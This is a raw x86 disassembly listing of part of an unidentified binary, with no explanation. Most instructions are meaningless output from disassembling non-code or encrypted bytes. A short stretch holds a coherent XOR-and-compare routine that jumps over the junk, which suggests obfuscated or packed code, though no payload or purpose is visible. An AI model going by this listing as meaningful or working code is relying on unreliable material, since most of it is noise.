  40b212:	xchg   esi,eax
  40b213:	std    
  40b214:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b215:	int3   
  40b216:	fild   DWORD PTR [ecx-0x2853cf2a]
  40b21c:	sub    DWORD PTR [eax+0x7d],0x914f3d34
  40b223:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b224:	ins    BYTE PTR es:[edi],dx
  40b225:	dec    eax
  40b226:	mov    eax,ds:0x801a5d21
  40b22b:	pop    esp
  40b22c:	cmc    
  40b22d:	faddp  st(0),st
  40b22f:	pop    ecx
  40b230:	jae    0x40b263
  40b232:	out    dx,al
  40b233:	inc    ecx
  40b234:	pop    edi
  40b235:	sub    BYTE PTR [ebx],bl
  40b237:	push   edi
  40b238:	xor    ch,BYTE PTR [eax-0x57]
  40b23b:	repnz sti 
  40b23d:	fcomp  QWORD PTR [ecx+0x2b]
  40b240:	pop    ds
  40b241:	int    0x87
  40b243:	pop    ss
  40b244:	mov    eax,0x9a16c7a5
  40b249:	cmp    al,0x9c
  40b24b:	arpl   WORD PTR [eax+0x3f],ax
  40b24e:	mov    ebx,0x4dfe7947
  40b253:	inc    edi
  40b254:	mov    esi,0xea280c6d
  40b259:	dec    ecx
  40b25a:	fstp   QWORD PTR [edi]
  40b25c:	lods   eax,DWORD PTR ds:[esi]
  40b25d:	push   ss
  40b25e:	lock jecxz 0x40b2b9
  40b261:	pop    esi
  40b262:	stos   BYTE PTR es:[edi],al
  40b263:	(bad)  
  40b264:	or     ecx,DWORD PTR [edi+0x5d]
  40b267:	stc    
  40b268:	push   ebp
  40b269:	iret   
  40b26a:	fs or  al,0x3
  40b26d:	pop    esp
  40b26e:	jae    0x40b290
  40b270:	addr16 inc ebx
  40b272:	push   ecx
  40b273:	pop    esi
  40b274:	lea    esp,[esi-0xda4bccf]
  40b27a:	fwait
  40b27b:	dec    ebp
  40b27c:	xlat   BYTE PTR ds:[ebx]
  40b27d:	bound  edi,QWORD PTR [ecx]
  40b27f:	lods   al,BYTE PTR ds:[esi]
  40b280:	test   DWORD PTR [edi-0x1f526f9a],esp
  40b286:	cmc    
  40b287:	aam    0xa9
  40b289:	pop    ss
  40b28a:	mov    eax,ds:0xc95f91ca
  40b28f:	push   ss
  40b290:	mov    ds:0xe99685c9,eax
  40b295:	dec    edi
  40b296:	jbe    0x40b22f
  40b298:	xor    BYTE PTR [ebx+ebp*1-0x4e],0x6d
  40b29d:	push   eax
  40b29e:	outs   dx,DWORD PTR ds:[esi]
  40b29f:	push   cs
  40b2a0:	mov    cl,0x8c
  40b2a2:	cmp    dh,ah
  40b2a4:	pop    es
  40b2a5:	push   edi
  40b2a6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2a7:	jb     0x40b2bf
  40b2a9:	cmp    ebp,eax
  40b2ab:	push   ebx
  40b2ac:	fld    TBYTE PTR [edx-0x7ceef040]
  40b2b2:	dec    ebp
  40b2b3:	aaa    
  40b2b4:	enter  0xe355,0xe3
  40b2b8:	adc    DWORD PTR [edx+0x7de48135],esi
  40b2be:	jmp    DWORD PTR [ecx+0x42eb0944]
  40b2c4:	mov    bl,0xa3
  40b2c6:	cli    
  40b2c7:	xchg   ebx,eax
  40b2c8:	inc    edx
  40b2c9:	mov    ebp,0x4d1a8483
  40b2ce:	pop    esp
  40b2cf:	enter  0x733a,0x4d
  40b2d3:	ror    BYTE PTR [esi+eiz*1-0x32515e5e],0xa6
  40b2db:	sub    al,0x7e
  40b2dd:	test   al,0x40
  40b2df:	mov    al,ds:0x75f0a89b
  40b2e4:	add    BYTE PTR [ebp+0x7af14fc5],cl
  40b2ea:	xor    bl,BYTE PTR [ebp+eiz*1+0x4e36bcc9]
  40b2f1:	sbb    al,0x81
  40b2f3:	xor    dl,BYTE PTR [eax]
  40b2f5:	lds    ebp,FWORD PTR [edx-0x3c771bf9]
  40b2fb:	out    0x1b,al
  40b2fd:	mov    esp,0x8ca89a9a
  40b302:	rep ins BYTE PTR es:[edi],dx
  40b304:	jae    0x40b357
  40b306:	popf   
  40b307:	mov    esi,0x7282acb
  40b30c:	je     0x40b329
  40b30e:	mov    bl,0x4d
  40b310:	or     BYTE PTR [esp+ebx*4],cl
  40b313:	inc    edx
  40b314:	fwait
  40b315:	popf   
  40b316:	imul   edi,edi,0x5b42b878
  40b31c:	xchg   edx,eax
  40b31d:	fisub  DWORD PTR [edi-0x77f6708e]
  40b323:	pop    esp
  40b324:	xor    eax,0x7f4bc884
  40b329:	jno    0x40b377
  40b32b:	mov    ds:0xa29c20c2,al
  40b330:	out    0x8d,al
  40b332:	es mov bl,0x8b
  40b335:	sti    
  40b336:	sbb    eax,DWORD PTR [ebp-0xf]
  40b339:	stos   BYTE PTR es:[edi],al
  40b33a:	inc    ecx
  40b33b:	mov    al,0xbf
  40b33d:	nop
  40b33e:	loope  0x40b352
  40b340:	cmp    al,0x12
  40b342:	js     0x40b39c
  40b344:	xchg   edi,eax
  40b345:	mov    ?,WORD PTR [edi+0xda66c1c]
  40b34b:	sub    eax,0x91268d09
  40b350:	fcmove st,st(1)
  40b352:	dec    edi
  40b353:	adc    dl,BYTE PTR [ecx]
  40b355:	and    al,BYTE PTR ds:0x80e604bd
  40b35b:	push   ebx
  40b35c:	xchg   esi,eax
  40b35d:	sbb    eax,0xa59bd91
  40b362:	fisub  DWORD PTR [esi+0x6b]
  40b365:	cdq    
  40b366:	push   ds
  40b367:	dec    DWORD PTR [esi]
  40b369:	bound  ecx,QWORD PTR [esi-0x3c862c77]
  40b36f:	mov    WORD PTR [edx],ss
  40b371:	pop    ebp
  40b372:	sti    
  40b373:	jbe    0x40b327
  40b375:	jmp    0x40b3aa
  40b377:	imul   ebx,ecx,0x67c967cb
  40b37d:	ss xor eax,0xf1bd6dfd
  40b383:	add    BYTE PTR [edx],bl
  40b385:	div    DWORD PTR [ebx-0x32]
  40b388:	jne    0x40b35a
  40b38a:	pop    ecx
  40b38b:	pop    ebp
  40b38c:	hlt    
  40b38d:	mov    ds:0xafecb8dd,al
  40b392:	jo     0x40b394
  40b394:	rcl    BYTE PTR [eax-0x76],cl
  40b397:	popa   
  40b398:	cmp    ch,bl
  40b39a:	fmul   st(5),st
  40b39c:	loop   0x40b33e
  40b39e:	push   cs
  40b39f:	je     0x40b3e2
  40b3a1:	test   al,0x9d
  40b3a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3a4:	out    0x66,eax
  40b3a6:	call   0xfff:0xe6f30a9c
  40b3ad:	pop    eax
  40b3ae:	fistp  DWORD PTR [edi]
  40b3b0:	cmc    
  40b3b1:	pop    ss
  40b3b2:	fdivr  DWORD PTR ds:0xc3a3b895
  40b3b8:	xor    ah,BYTE PTR [eax+edi*2]
  40b3bb:	fadd   DWORD PTR [ecx-0x16a32dcf]
  40b3c1:	dec    edx
  40b3c2:	shl    DWORD PTR [edx+edx*1-0x72a62ce6],0xe7
  40b3ca:	mov    esp,0x5130cef8
  40b3cf:	mul    BYTE PTR [eax]
  40b3d1:	fwait
  40b3d2:	retf   
  40b3d3:	xor    BYTE PTR [ebx+0x0],dh
  40b3d6:	cmp    eax,0x83283a3e
  40b3db:	inc    ebx
  40b3dc:	in     eax,dx
  40b3dd:	gs jbe 0x40b3b3
  40b3e0:	adc    DWORD PTR [eax+eiz*8],ebp
  40b3e3:	add    bl,ch
  40b3e5:	adc    eax,0x14438c81
  40b3ea:	call   0xc84c5784
  40b3ef:	cmp    ch,BYTE PTR [ebp+esi*2+0x7]
  40b3f3:	sub    bh,BYTE PTR [ebp-0x6b1caa5]
  40b3f9:	dec    edx
  40b3fa:	(bad)  [esi+0xf]
  40b3fd:	mov    ?,WORD PTR [edx]
  40b3ff:	test   DWORD PTR [ebp-0x25c420d5],esp
  40b405:	ja     0x40b82a
  40b40b:	mov    edx,DWORD PTR [ebp-0x2c]
  40b40e:	jmp    0x40bcba
  40b413:	jmp    0x40b82a
  40b418:	ror    DWORD PTR [edi-0x34],cl
  40b41b:	aam    0x4c
  40b41d:	pop    ebp
  40b41e:	rcl    DWORD PTR [ecx-0x44],cl
  40b421:	xchg   esp,eax
  40b422:	(bad)  
  40b423:	mov    ah,0x81
  40b425:	imul   edx,DWORD PTR [ebx+eax*1+0x7e7e86e8],0x70
  40b42d:	jns    0x40b4ad
  40b42f:	jle    0x40b49f
  40b431:	ret    0x5e07
  40b434:	xchg   esp,eax
  40b435:	sbb    BYTE PTR [eax],bh
  40b437:	adc    BYTE PTR [ecx-0x34],ah
  40b43a:	pop    ss
  40b43b:	sbb    esp,DWORD PTR [edx+0x30d9c961]
  40b441:	add    ebx,DWORD PTR [edi-0x2208d07e]
  40b447:	mov    eax,eax
  40b449:	cld    
  40b44a:	mov    ebp,0x7684e9af
  40b44f:	jne    0x40b4c6
  40b451:	inc    ecx
  40b452:	addr16 js 0x40b4be
  40b455:	mov    WORD PTR [esi-0x37],ss
  40b458:	fs dec edi
  40b45a:	and    ebp,DWORD PTR [edi+edx*4-0x53]
  40b45e:	cmp    BYTE PTR [esi-0x9],ch
  40b461:	sbb    al,dh
  40b463:	sub    cl,bh
  40b465:	cwde   
  40b466:	dec    ebp
  40b467:	popf   
  40b468:	cs cmc 
  40b46a:	pop    eax
  40b46b:	sbb    dl,BYTE PTR [eax-0x65bf83b8]
  40b471:	push   ecx
  40b472:	mov    edi,0x3e5d5bd0
  40b477:	or     al,0x53
  40b479:	out    0xca,al
  40b47b:	mov    eax,ds:0xd9c9eced
  40b480:	loop   0x40b4bd
  40b482:	ja     0x40b4ae
  40b484:	es push ebx
  40b486:	ss out 0x5f,al
  40b489:	add    bh,BYTE PTR [esp+ebp*1]
  40b48c:	push   esi
  40b48d:	or     BYTE PTR [edx],bl
  40b48f:	bound  esp,QWORD PTR [edx-0x46]
  40b492:	or     al,0x6c
  40b494:	call   0x3594a869
  40b499:	mov    edi,0xe8dc27b2
  40b49e:	sbb    eax,0xb42db3c8
  40b4a3:	xchg   edi,eax
  40b4a4:	inc    ebx
  40b4a5:	or     ah,dl
  40b4a7:	test   DWORD PTR [ebx-0x2fbbaa2d],ecx
  40b4ad:	push   esp
  40b4ae:	dec    esp
  40b4af:	cmp    BYTE PTR [eax+ecx*8+0x1f4eeb1e],dh
  40b4b6:	cmp    esi,esi
  40b4b8:	jmp    0x4004edf6
  40b4bd:	in     eax,dx
  40b4be:	fimul  WORD PTR [eax+edx*4]
  40b4c1:	adc    al,0xbe
  40b4c3:	adc    edx,DWORD PTR [ebp-0x23e43c28]
  40b4c9:	add    DWORD PTR [eax],0x8bf49111
  40b4cf:	pop    edx
  40b4d0:	rcr    BYTE PTR [esi],0xd4
  40b4d3:	cmp    DWORD PTR [esi+esi*1],edx
  40b4d6:	les    edx,FWORD PTR [edx-0x4ad2fef7]
  40b4dc:	fld    DWORD PTR [esi-0x7e]
  40b4df:	push   ebx
  40b4e0:	cmp    eax,0xedf37f71
  40b4e5:	jg     0x40b48b
  40b4e7:	repnz aas 
  40b4e9:	xor    BYTE PTR [edi],ch
  40b4eb:	pop    ds
  40b4ec:	in     eax,dx
  40b4ed:	sbb    edx,eax
  40b4ef:	pushf  
  40b4f0:	imul   ebx,DWORD PTR [ecx-0x69bb5152],0x25
  40b4f7:	cmp    al,0xa2
  40b4f9:	add    eax,0x830a54dd
  40b4fe:	push   ss
  40b4ff:	sti    
  40b500:	in     eax,0x54
  40b502:	inc    edx
  40b503:	jb     0x40b571
  40b505:	std    
  40b506:	inc    esi
  40b507:	mov    esp,0xd2914889
  40b50c:	es (bad) 
  40b50e:	xlat   BYTE PTR ds:[ebx]
  40b50f:	or     edi,DWORD PTR [edx]
  40b511:	pop    es
  40b512:	pop    DWORD PTR [ecx]
  40b514:	loopne 0x40b56e
  40b516:	in     al,0x1b
  40b518:	adc    al,0x8d
  40b51a:	cld    
  40b51b:	dec    edi
  40b51c:	test   eax,0xebc26aef
  40b521:	push   ebp
  40b522:	iret   
  40b523:	or     al,0x69
  40b525:	popf   
  40b526:	sub    BYTE PTR [esi+esi*1+0x32ec8441],al
  40b52d:	mov    ebx,0x9e6fcbd4
  40b532:	adc    dl,BYTE PTR [edi]
  40b534:	(bad)  
  40b535:	and    edx,eax
  40b537:	push   ds
  40b538:	mov    bl,0x3
  40b53a:	xchg   edi,eax
  40b53b:	cmp    dh,BYTE PTR [edi+0x783e7be2]
  40b541:	test   al,0x7d
  40b543:	fs jle 0x40b51d
  40b546:	and    ah,BYTE PTR [eax-0x1514dd3a]
  40b54c:	xchg   esp,eax
  40b54d:	mov    edi,0x156d8201
  40b552:	mov    ch,0xf8
  40b554:	clc    
  40b555:	and    dl,dh
  40b557:	dec    esp
  40b558:	xchg   esi,eax
  40b559:	adc    ch,ch
  40b55b:	jae    0x40b50b
  40b55d:	sub    DWORD PTR [eax],esi
  40b55f:	mov    ebp,DWORD PTR [eax-0x8]
  40b562:	dec    eax
  40b563:	call   0xd49b5e37
  40b568:	mov    ds:0xf5c3a8ea,al
  40b56d:	popf   
  40b56e:	lds    ebp,FWORD PTR [eax+0x9]
  40b571:	div    BYTE PTR [ecx-0x7b3569d9]
  40b577:	mov    eax,0x78967591
  40b57c:	daa    
  40b57d:	bound  ecx,QWORD PTR [esi-0x730211f8]
  40b583:	ins    DWORD PTR es:[edi],dx
  40b584:	and    al,0xf2
  40b586:	das    
  40b587:	mov    ah,0xb1
  40b589:	int    0x5e
  40b58b:	ror    DWORD PTR [eax+0x4e7dbe5],1
  40b591:	sbb    ebp,DWORD PTR [ecx-0x74d947a2]
  40b597:	mov    ch,0xe0
  40b599:	inc    ebx
  40b59a:	es sub al,0x9a
  40b59d:	outs   dx,DWORD PTR ds:[esi]
  40b59e:	cwde   
  40b59f:	aad    0x2d
  40b5a1:	test   DWORD PTR [edx+0x41],esi
  40b5a4:	imul   ecx,DWORD PTR ss:[edi-0x2a],0x20
  40b5a9:	inc    ecx
  40b5aa:	jmp    0xe6d69624
  40b5af:	loope  0x40b62a
  40b5b1:	das    
  40b5b2:	push   ss
  40b5b3:	dec    ecx
  40b5b4:	push   edx
  40b5b5:	sbb    bh,al
  40b5b7:	mov    eax,ds:0x6663ed31
  40b5bc:	xor    eax,0xfa75962a
  40b5c1:	adc    ebx,edi
  40b5c3:	mov    WORD PTR [edi+0x2e],?
  40b5c6:	xchg   ecx,eax
  40b5c7:	fdivr  QWORD PTR [edi]
  40b5c9:	test   al,0x88
  40b5cb:	arpl   WORD PTR [eax],cx
  40b5cd:	pusha  
  40b5ce:	pop    es
  40b5cf:	dec    edi
  40b5d0:	inc    ebx
  40b5d1:	aas    
  40b5d2:	xor    eax,0xb037cd6f
  40b5d7:	aaa    
  40b5d8:	push   cs
  40b5d9:	add    DWORD PTR [ebp-0x280a1726],ebp
  40b5df:	sahf   
  40b5e0:	aaa    
  40b5e1:	adc    DWORD PTR ds:0xebd54df6,ecx
  40b5e7:	hlt    
  40b5e8:	cmp    al,0x0
  40b5ea:	loope  0x40b5f1
  40b5ec:	pop    ebx
  40b5ed:	in     eax,dx
  40b5ee:	mov    BYTE PTR [ecx+0x132d3590],dh
  40b5f4:	mov    bl,0x83
  40b5f6:	call   0x9685:0xc7dae3e8
  40b5fd:	cmp    ecx,ebx
  40b5ff:	pop    ebx
  40b600:	ds pop ebx
  40b602:	jge    0x40b59c
  40b604:	jle    0x40b67b
  40b606:	loop   0x40b591
  40b608:	test   eax,0xf1eaad0a
  40b60d:	jno    0x40b661
  40b60f:	div    BYTE PTR [edi+0x5c]
  40b612:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b613:	scas   eax,DWORD PTR es:[edi]
  40b614:	test   BYTE PTR [esi],bl
  40b616:	aas    
  40b617:	pop    es
  40b618:	dec    ebx
  40b619:	lods   al,BYTE PTR ds:[esi]
  40b61a:	ror    edi,0x4e
  40b61d:	adc    ebp,DWORD PTR [edx+eiz*4]
  40b620:	or     ebp,DWORD PTR [edx]
  40b622:	fldl2t 
  40b624:	jb     0x40b5e2
  40b626:	add    DWORD PTR [esi+ebx*1-0x7f],0x4b
  40b62b:	add    eax,0x4f16bf2d
  40b630:	lahf   
  40b631:	mov    dl,0x55
  40b633:	je     0x40b5cd
  40b635:	cmp    bh,BYTE PTR [ecx]
  40b637:	mov    BYTE PTR [eax],al
  40b639:	sub    dl,BYTE PTR [ebx-0x3ae59676]
  40b63f:	(bad)  
  40b640:	out    dx,al
  40b641:	add    eax,0xf6223a10
  40b646:	cmp    DWORD PTR [ebp+0xdb36102],edx
  40b64c:	(bad)  
  40b64d:	push   eax
  40b64e:	addr16 aaa 
  40b650:	mov    dh,0x76
  40b652:	jae    0x40b69d
  40b654:	lea    esp,[edx]
  40b656:	enter  0xa7ff,0x42
  40b65a:	xor    edi,eax
  40b65c:	or     al,dh
  40b65e:	fdivr  DWORD PTR [eax+0x3bf6e636]
  40b664:	in     eax,0xdf
  40b666:	jno    0x40b6af
  40b668:	shr    BYTE PTR ds:0x79100695,1
  40b66e:	or     cl,ch
  40b670:	or     bl,BYTE PTR [ebp-0x28]
  40b673:	ds je  0x40b65d
  40b676:	out    0xef,al
  40b678:	dec    edi
  40b679:	dec    eax
  40b67a:	fdivr  st(1),st
  40b67c:	push   ebx
  40b67d:	das    
  40b67e:	dec    esp
  40b67f:	ja     0x40b677
  40b681:	enter  0xb7fb,0x6f
  40b685:	pop    es
  40b686:	inc    ebp
  40b687:	jno    0x40b6da
  40b689:	and    DWORD PTR [eax+eax*8],esp
  40b68c:	scas   eax,DWORD PTR es:[edi]
  40b68d:	sbb    BYTE PTR [eax+0x27876e77],ch
  40b693:	push   edx
  40b694:	neg    BYTE PTR [ebx+0x1dd4a6]
  40b69a:	imul   edx,esp,0xffffffe2
  40b69d:	mov    BYTE PTR [ebx+0x5fc7b5b7],al
  40b6a3:	xchg   BYTE PTR [esi],ch
  40b6a5:	dec    esp
  40b6a6:	mov    eax,0xa4fed7fd
  40b6ab:	push   ebx
  40b6ac:	dec    esp
  40b6ad:	pop    ebp
  40b6ae:	icebp  
  40b6af:	pop    ebx
  40b6b0:	(bad)  
  40b6b1:	lea    ebx,[ebx]
  40b6b3:	xor    bl,BYTE PTR [edx]
  40b6b5:	enter  0x18aa,0xf1
  40b6b9:	or     esi,DWORD PTR [ebx-0x3c]
  40b6bc:	out    0xa4,eax
  40b6be:	mov    bh,0xb7
  40b6c0:	shr    BYTE PTR [esi+0x14],cl
  40b6c3:	aad    0xf0
  40b6c5:	fucomp st(3)
  40b6c7:	inc    eax
  40b6c8:	inc    ecx
  40b6c9:	and    dh,BYTE PTR es:[eax]
  40b6cc:	dec    ebx
  40b6cd:	adc    eax,0x51331f73
  40b6d2:	cwde   
  40b6d3:	jne    0x40b673
  40b6d5:	and    eax,0x9b0f0e39
  40b6da:	fbstp  TBYTE PTR ss:[ebx+0x3d]
  40b6de:	stos   DWORD PTR es:[edi],eax
  40b6df:	loopne 0x40b664
  40b6e1:	call   0xe12d1ec5
  40b6e6:	mov    edx,0x7713c1d4
  40b6eb:	pop    edx
  40b6ec:	mov    eax,ds:0x5dc8beff
  40b6f1:	es test al,0xc7
  40b6f4:	test   BYTE PTR [ebx+0x6a],ah
  40b6f7:	test   DWORD PTR [ebx+0x11],ecx
  40b6fa:	push   ebx
  40b6fb:	das    
  40b6fc:	rol    BYTE PTR [ebx],0x50
  40b6ff:	fwait
  40b700:	sbb    eax,0x927fbc0c
  40b705:	pop    es
  40b706:	cmp    DWORD PTR [ebx+0x1346e4d5],ecx
  40b70c:	pop    edx
  40b70d:	sub    BYTE PTR [ebx+0x3812e550],al
  40b713:	xcrypt-ofb (bad)
  40b714:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b715:	push   0xf69c01d5
  40b71a:	xor    bh,dh
  40b71c:	mov    bh,0xfb
  40b71e:	ret    
  40b71f:	test   BYTE PTR [ebp-0x3ef738e4],0x49
  40b726:	fmul   st(5),st
  40b728:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b729:	sbb    al,0x4
  40b72b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b72c:	push   ebp
  40b72d:	(bad)  
  40b72e:	fiadd  WORD PTR [ebp+0x16]
  40b731:	shl    BYTE PTR [edi+ebx*2+0x6],1
  40b735:	xlat   BYTE PTR ds:[ebx]
  40b736:	call   0xcba9:0x13d659a3
  40b73d:	test   al,0x28
  40b73f:	push   esp
  40b740:	sbb    al,0xef
  40b742:	out    0xc,eax
  40b744:	in     eax,dx
  40b745:	jbe    0x40b7b7
  40b747:	adc    BYTE PTR [ecx],0x74
  40b74a:	adc    DWORD PTR [eax+0x66],0x7486bd73
  40b751:	sahf   
  40b752:	xchg   DWORD PTR [ecx*2+0x4bd55c6a],ebp
  40b759:	mov    ebp,0x4fa91dca
  40b75e:	sub    al,0x1f
  40b760:	pop    es
  40b761:	pop    edi
  40b762:	jno    0x40b755
  40b764:	pushf  
  40b765:	std    
  40b766:	dec    ebx
  40b767:	aaa    
  40b768:	fistp  DWORD PTR [eax]
  40b76a:	shl    BYTE PTR [eax],0x77
  40b76d:	mov    al,0x33
  40b76f:	in     al,dx
  40b770:	push   ds
  40b771:	stc    
  40b772:	cdq    
  40b773:	sbb    al,0xfa
  40b775:	and    dh,BYTE PTR [ebx+0x19]
  40b778:	sub    al,0x85
  40b77a:	pop    esi
  40b77b:	pop    edi
  40b77c:	dec    esi
  40b77d:	test   esi,eax
  40b77f:	pop    ebp
  40b780:	adc    eax,edx
  40b782:	inc    esp
  40b783:	xlat   BYTE PTR ds:[ebx]
  40b784:	jl     0x40b7df
  40b786:	lods   al,BYTE PTR ds:[esi]
  40b787:	and    edi,DWORD PTR [eax-0x2b13c82f]
  40b78d:	mov    ecx,0x9041cdda
  40b792:	sub    al,0x2f
  40b794:	inc    esp
  40b795:	push   edi
  40b796:	add    edi,eax
  40b798:	pop    eax
  40b799:	push   esi
  40b79a:	sar    BYTE PTR [esi-0x4d38eb82],0x7f
  40b7a1:	outs   dx,DWORD PTR ds:[esi]
  40b7a2:	adc    eax,DWORD PTR cs:[esi-0x37]
  40b7a6:	jp     0x40b777
  40b7a8:	cmp    al,0xcc
  40b7aa:	(bad)  
  40b7ab:	pop    eax
  40b7ac:	popa   
  40b7ad:	add    DWORD PTR [edi+0x1f],ebx
  40b7b0:	inc    eax
  40b7b1:	dec    ecx
  40b7b2:	(bad)  
  40b7b3:	lods   eax,DWORD PTR ds:[esi]
  40b7b4:	pop    eax
  40b7b5:	aam    0x8a
  40b7b7:	push   eax
  40b7b8:	and    eax,0xd0938495
  40b7bd:	dec    edx
  40b7be:	cmc    
  40b7bf:	xchg   edx,eax
  40b7c0:	xchg   BYTE PTR [eax],al
  40b7c2:	or     DWORD PTR [eax-0x45131276],ebx
  40b7c8:	or     cl,BYTE PTR [edx+0x607bb7f]
  40b7ce:	in     eax,dx
  40b7cf:	xchg   esi,eax
  40b7d0:	mov    bh,0x82
  40b7d2:	or     ebx,DWORD PTR [edi+0x9]
  40b7d5:	inc    edi
  40b7d6:	inc    edx
  40b7d7:	push   0x8b0ac463
  40b7dc:	iret   
  40b7dd:	xchg   esp,eax
  40b7de:	adc    dh,BYTE PTR [edi-0x2e80de9c]
  40b7e4:	and    esp,DWORD PTR [eax+0x47]
  40b7e7:	loopne 0x40b7a2
  40b7e9:	jp     0x40b84b
  40b7eb:	sub    al,0x6d
  40b7ed:	mov    ah,0xef
  40b7ef:	and    BYTE PTR [edx-0x69cfe317],bl
  40b7f5:	or     DWORD PTR [eax-0x6d],edi
  40b7f8:	push   ss
  40b7f9:	xchg   edx,eax
  40b7fa:	xchg   DWORD PTR [esi+0x3],ebp
  40b7fd:	mov    bh,0x37
  40b7ff:	push   ecx
  40b800:	push   ebp
  40b801:	repz add al,0x7e
  40b804:	gs out dx,al
  40b806:	mov    ebx,0x94655237
  40b80b:	ds or  eax,0xe045475
  40b811:	inc    esp
  40b812:	add    BYTE PTR [edx+0x575f572e],dh
  40b818:	popf   
  40b819:	jb     0x40b859
  40b81b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b81c:	xchg   esp,eax
  40b81d:	xchg   edi,eax
  40b81e:	sti    
  40b81f:	ds mov ah,ah
  40b822:	xor    BYTE PTR [eax],ch
  40b824:	shr    BYTE PTR [ecx-0x40384dcf],cl
  40b82a:	mov    edx,DWORD PTR [ebp-0x34]
  40b82d:	mov    edi,DWORD PTR [ebp-0x4]
  40b830:	xor    edx,eax
  40b832:	xor    edi,eax
  40b834:	add    edi,ecx
  40b836:	add    edx,ecx
  40b838:	imul   edx,edi
  40b83b:	mov    edi,DWORD PTR [ebp-0x8]
  40b83e:	mov    ebx,DWORD PTR [ebp-0x10]
  40b841:	sub    ebx,edi
  40b843:	cmp    ebx,edx
  40b845:	ja     0x40b853
  40b84b:	mov    edx,DWORD PTR [ebp-0x30]
  40b84e:	jmp    0x40bcba
  40b853:	mov    edx,DWORD PTR [ebp-0x38]
  40b856:	mov    edi,DWORD PTR [ebp-0x4]
  40b859:	xor    edx,eax
  40b85b:	xor    edi,eax
  40b85d:	add    edi,ecx
  40b85f:	add    edx,ecx
  40b861:	imul   edx,edi
  40b864:	mov    edi,DWORD PTR [ebp-0x8]
  40b867:	mov    ebx,DWORD PTR [ebp-0x10]
  40b86a:	sub    ebx,edi
  40b86c:	cmp    ebx,edx
  40b86e:	ja     0x40b87c
  40b874:	mov    edx,DWORD PTR [ebp-0x34]
  40b877:	jmp    0x40bcba
  40b87c:	mov    edx,DWORD PTR [ebp-0x3c]
  40b87f:	mov    edi,DWORD PTR [ebp-0x4]
  40b882:	xor    edx,eax
  40b884:	xor    edi,eax
  40b886:	add    edx,ecx
  40b888:	add    edi,ecx
  40b88a:	imul   edx,edi
  40b88d:	mov    edi,DWORD PTR [ebp-0x8]
  40b890:	mov    ebx,DWORD PTR [ebp-0x10]
  40b893:	jmp    0x40bcaa
  40b898:	xor    eax,DWORD PTR [esi-0x7c]
  40b89b:	outs   dx,DWORD PTR ds:[esi]
  40b89c:	jne    0x40b91b
  40b89e:	std    
  40b89f:	inc    edx
  40b8a0:	sbb    DWORD PTR [eax+ebx*8],0x44
  40b8a4:	imul   ecx,DWORD PTR [edx+0x14],0x7e82e2a4
  40b8ab:	jle    0x40b91d
  40b8ad:	jns    0x40b92d
  40b8af:	jle    0x40b847
  40b8b1:	out    0x7e,al
  40b8b3:	dec    esp
  40b8b4:	mov    dh,0x1
  40b8b6:	inc    eax
  40b8b7:	icebp  
  40b8b8:	popf   
  40b8b9:	or     al,0xfd
  40b8bb:	out    dx,eax
  40b8bc:	mov    ecx,0x99a66898
  40b8c1:	das    
  40b8c2:	add    eax,0x2b818778
  40b8c7:	mov    esi,0xcf60f186
  40b8cc:	dec    esi
  40b8cd:	lods   al,BYTE PTR ds:[esi]
  40b8ce:	jae    0x40b910
  40b8d0:	push   es
  40b8d1:	sub    dl,dh
  40b8d3:	inc    eax
  40b8d4:	rep gs ins DWORD PTR es:[edi],dx
  40b8d7:	xchg   ebx,eax
  40b8d8:	adc    esp,DWORD PTR [eax]
  40b8da:	lahf   
  40b8db:	or     DWORD PTR [edx-0x23b60201],ebp
  40b8e1:	jmp    0x57df912
  40b8e6:	rol    DWORD PTR [eax-0x1c46664c],1
  40b8ec:	sub    BYTE PTR [eax],0x8a
  40b8ef:	and    BYTE PTR [ecx],cl
  40b8f1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b8f2:	enter  0x3845,0xdc
  40b8f6:	jecxz  0x40b91c
  40b8f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b8f9:	inc    eax
  40b8fa:	pop    edi
  40b8fb:	cmp    al,0xb0
  40b8fd:	pop    ss
  40b8fe:	ror    DWORD PTR [esi-0x3d072d17],1
  40b904:	pop    es
  40b905:	outs   dx,DWORD PTR ds:[esi]
  40b906:	adc    ebx,edx
  40b908:	cmp    BYTE PTR [edi],dl
  40b90a:	pop    ds
  40b90b:	or     eax,0x6aedb075
  40b910:	xchg   esp,eax
  40b911:	dec    edi
  40b912:	scas   al,BYTE PTR es:[edi]
  40b913:	jbe    0x40b8d6
  40b915:	leave  
  40b916:	mov    ss,WORD PTR [edi+ebx*8]
  40b919:	jbe    0x40b928
  40b91b:	jmp    0xc97c:0x7acfd859
  40b922:	push   es
  40b923:	jg     0x40b912
  40b925:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b926:	cmc    
  40b927:	dec    esp
  40b928:	xlat   BYTE PTR ds:[ebx]
  40b929:	jae    0x40b974
  40b92b:	leave  
  40b92c:	and    esi,DWORD PTR [ebp+eiz*8+0x8bdd62e]
  40b933:	call   0x11f9:0x74ec36f9
  40b93a:	inc    edx
  40b93b:	ins    BYTE PTR es:[edi],dx
  40b93c:	add    BYTE PTR [esi],dh
  40b93e:	fild   QWORD PTR [esi+0xf746bc3]
  40b944:	mov    WORD PTR [esi],?
  40b946:	outs   dx,DWORD PTR ds:[esi]
  40b947:	test   DWORD PTR [edi-0x367c35a4],esp
  40b94d:	sub    dl,BYTE PTR es:[esi-0x4b1556eb]
  40b954:	std    
  40b955:	out    dx,al
  40b956:	mov    BYTE PTR [esi+edi*8],cl
  40b959:	mov    ecx,0x97bbec2f
  40b95e:	push   esi
  40b95f:	pop    ds
  40b960:	ficom  WORD PTR [ebx+0x14]
  40b963:	inc    ebx
  40b964:	mov    ds:0x5937d051,al
  40b969:	mov    bl,0x2d
  40b96b:	stc    
  40b96c:	neg    BYTE PTR [edi]
  40b96e:	imul   eax,DWORD PTR [ebx+0x62],0xf6f2e6d9
  40b975:	mov    al,0xb3
  40b977:	xchg   esp,eax
